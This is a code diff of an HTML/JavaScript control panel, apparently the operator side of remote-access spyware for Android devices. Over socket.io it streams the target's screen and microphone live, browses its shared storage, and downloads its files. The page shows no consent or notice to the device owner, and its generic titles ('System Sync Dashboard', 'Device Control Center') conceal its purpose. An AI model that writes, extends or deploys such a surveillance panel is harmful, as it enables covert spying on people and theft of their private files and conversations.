@@ -3,176 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Sync Dashboard</title>
-    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <title>Device Control Center</title>
+    <script src="/socket.io/socket.io.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: white; margin: 20px; }
-        .container { display: flex; gap: 20px; flex-wrap: wrap; }
-        .card { background: #2d2d2d; padding: 20px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        #screen-view { width: 480px; height: auto; border: 2px solid #444; background: #000; }
-        .controls { margin-top: 10px; display: flex; gap: 10px; }
-        button { padding: 10px 20px; cursor: pointer; border: none; border-radius: 5px; font-weight: bold; transition: 0.3s; }
-        .btn-start { background: #27ae60; color: white; }
-        .btn-stop { background: #c0392b; color: white; }
-        .btn-start:hover { background: #2ecc71; }
-        .status { padding: 5px 10px; border-radius: 5px; font-size: 0.8em; margin-bottom: 10px; display: inline-block; }
-        .online { background: #27ae60; }
-        .offline { background: #7f8c8d; }
+        body { font-family: sans-serif; background: #121212; color: #fff; margin: 20px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px; }
+        .card { background: #1e1e1e; padding: 20px; border-radius: 8px; border: 1px solid #333; }
+        #screen-view { width: 100%; border-radius: 4px; background: #000; }
+        .btn { padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin: 5px; }
+        .btn-green { background: #2e7d32; color: white; }
+        .btn-red { background: #c62828; color: white; }
+        #file-container { height: 200px; overflow-y: auto; background: #000; margin-top: 10px; padding: 10px; }
+        .file-item { padding: 8px; border-bottom: 1px solid #222; cursor: pointer; }
     </style>
 </head>
 <body>
+    <h1>System Monitor</h1>
+    <div id="status">Connecting...</div>
 
-    <h1>Device Monitor: <span id="device-id">Waiting...</span></h1>
-    <div id="connection-status" class="status offline">Disconnected</div>
-
-    <div class="container">
+    <div class="grid">
         <div class="card">
             <h3>Live Screen</h3>
-            <img id="screen-view" src="" alt="Waiting for stream...">
-            <div class="controls">
-                <button class="btn-start" onclick="sendCommand('start-screen')">Start Stream</button>
-                <button class="btn-stop" onclick="sendCommand('stop-screen')">Stop Stream</button>
-            </div>
+            <img id="screen-view" src="" alt="Stream Offline">
+            <button class="btn btn-green" onclick="emit('start-screen')">Start</button>
+            <button class="btn btn-red" onclick="emit('stop-screen')">Stop</button>
         </div>
 
         <div class="card">
-            <h3>Live Microphone</h3>
-            <p>Status: <span id="audio-status">Idle</span></p>
-            <div class="controls">
-                <button class="btn-start" onclick="startAudio()">Listen Live</button>
-                <button class="btn-stop" onclick="stopAudio()">Mute</button>
-            </div>
-            <h3>File Explorer</h3>
-    <p>Current Path: <span id="current-path">/storage/emulated/0</span></p>
-    <div id="file-container" style="max-height: 300px; overflow-y: auto; background: #000; padding: 10px;">
+            <h3>Live Audio</h3>
+            <button class="btn btn-green" onclick="startAudio()">Listen</button>
+            <button class="btn btn-red" onclick="emit('stop-audio')">Mute</button>
         </div>
-    <button class="btn-start" style="margin-top:10px" onclick="browseFolder('/storage/emulated/0')">Refresh Home</button>
-</div>
-            <p style="font-size: 0.7em; color: #aaa; margin-top: 10px;">Note: Click 'Listen' to activate browser audio context.</p>
+
+        <div class="card">
+            <h3>Files</h3>
+            <button class="btn" onclick="emit('list-files:/storage/emulated/0')">Home Directory</button>
+            <div id="file-container"></div>
         </div>
     </div>
 
     <script>
-        const socket = io("http://YOUR_SERVER_IP:3000"); // Replace with your actual server IP
-        const screenImg = document.getElementById('screen-view');
-        const statusDiv = document.getElementById('connection-status');
-        
-        // --- AUDIO PLAYBACK CONFIGURATION ---
-        // Setup for 16-bit PCM 44100Hz Mono
+        // Automatic connection to current host
+        const socket = io(); 
         const audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
-        let nextStartTime = 0;
+        let nextStart = 0;
 
-        socket.on('connect', () => {
-            statusDiv.innerText = "Online";
-            statusDiv.className = "status online";
-        });
+        socket.on('connect', () => document.getElementById('status').innerText = "Online");
+        socket.on('data-stream', (b64) => document.getElementById('screen-view').src = "data:image/jpeg;base64," + b64);
 
-        socket.on('disconnect', () => {
-            statusDiv.innerText = "Disconnected";
-            statusDiv.className = "status offline";
-        });
-
-        // --- SCREEN STREAM HANDLING ---
-        socket.on('data-stream', (base64) => {
-            screenImg.src = "data:image/jpeg;base64," + base64;
-        });
-
-        // --- AUDIO STREAM HANDLING ---
-        socket.on('audio-stream', (base64Data) => {
-            if (audioCtx.state === 'suspended') {
-                audioCtx.resume();
-            }
-            playPcmData(base64Data);
-            document.getElementById('audio-status').innerText = "Streaming...";
-        });
-
-        function playPcmData(base64Data) {
-            const binaryString = window.atob(base64Data);
-            const len = binaryString.length;
-            const bytes = new Int16Array(len / 2);
-
-            for (let i = 0; i < len; i += 2) {
-                // Convert 2 bytes to 16-bit Int (Little Endian)
-                bytes[i / 2] = (binaryString.charCodeAt(i + 1) << 8) | binaryString.charCodeAt(i);
-            }
-
-            // Convert to Float32 for Web Audio API
-            const float32Data = new Float32Array(bytes.length);
-            for (let i = 0; i < bytes.length; i++) {
-                float32Data[i] = bytes[i] / 32768.0;
-            }
-
-            const buffer = audioCtx.createBuffer(1, float32Data.length, 44100);
-            buffer.getChannelData(0).set(float32Data);
-
-            const source = audioCtx.createBufferSource();
-            source.buffer = buffer;
-            source.connect(audioCtx.destination);
-
-            const currentTime = audioCtx.currentTime;
-            if (nextStartTime < currentTime) {
-                nextStartTime = currentTime;
-            }
-            source.start(nextStartTime);
-            nextStartTime += buffer.duration;
-        }
-
-        // --- COMMAND LOGIC ---
-        function sendCommand(cmd) {
-            socket.emit('command', cmd);
-        }
+        function emit(cmd) { socket.emit('command', cmd); }
 
         function startAudio() {
             if (audioCtx.state === 'suspended') audioCtx.resume();
-            sendCommand('start-audio');
-            document.getElementById('audio-status').innerText = "Requesting...";
+            emit('start-audio');
         }
 
-        function stopAudio() {
-            sendCommand('stop-audio');
-            document.getElementById('audio-status').innerText = "Idle";
-        }
-        function browseFolder(path) {
-    document.getElementById('current-path').innerText = path;
-    socket.emit('command', 'list-files:' + path);
-}
-
-socket.on('file-list', (jsonString) => {
-    const files = JSON.parse(jsonString);
-    const container = document.getElementById('file-container');
-    container.innerHTML = ''; // Clear previous
-
-    files.forEach(file => {
-        const item = document.createElement('div');
-        item.style.padding = "5px";
-        item.style.borderBottom = "1px solid #333";
-        item.style.cursor = "pointer";
-        
-        const icon = file.isDir ? "📁 " : "📄 ";
-        item.innerHTML = `<span>${icon} ${file.name}</span>`;
-        
-        item.onclick = () => {
-            if (file.isDir) {
-                browseFolder(file.path);
-            } else {
-                if(confirm("Download " + file.name + "?")) {
-                    socket.emit('command', 'download:' + file.path);
-                }
+        socket.on('audio-stream', (b64) => {
+            const binary = window.atob(b64);
+            const bytes = new Int16Array(binary.length / 2);
+            for (let i = 0; i < binary.length; i += 2) {
+                bytes[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i);
             }
-        };
-        container.appendChild(item);
-    });
-});
+            const f32 = new Float32Array(bytes.length);
+            for (let i = 0; i < bytes.length; i++) f32[i] = bytes[i] / 32768.0;
+            
+            const buf = audioCtx.createBuffer(1, f32.length, 44100);
+            buf.getChannelData(0).set(f32);
+            const src = audioCtx.createBufferSource();
+            src.buffer = buf;
+            src.connect(audioCtx.destination);
+            nextStart = Math.max(nextStart, audioCtx.currentTime);
+            src.start(nextStart);
+            nextStart += buf.duration;
+        });
 
-socket.on('file-download', (jsonString) => {
-    const file = JSON.parse(jsonString);
-    const link = document.createElement('a');
-    link.href = "data:application/octet-stream;base64," + file.data;
-    link.download = file.name;
-    link.click();
-});
+        socket.on('file-list', (json) => {
+            const list = JSON.parse(json).files;
+            const cont = document.getElementById('file-container');
+            cont.innerHTML = '';
+            list.forEach(f => {
+                const div = document.createElement('div');
+                div.className = 'file-item';
+                div.innerText = (f.isDir ? "📁 " : "📄 ") + f.name;
+                div.onclick = () => f.isDir ? emit('list-files:' + f.path) : emit('download:' + f.path);
+                cont.appendChild(div);
+            });
+        });
+
+        socket.on('file-download', (json) => {
+            const f = JSON.parse(json);
+            const a = document.createElement('a');
+            a.href = "data:application/octet-stream;base64," + f.data;
+            a.download = f.name;
+            a.click();
+        });
     </script>
 </body>
 </html>
-
-
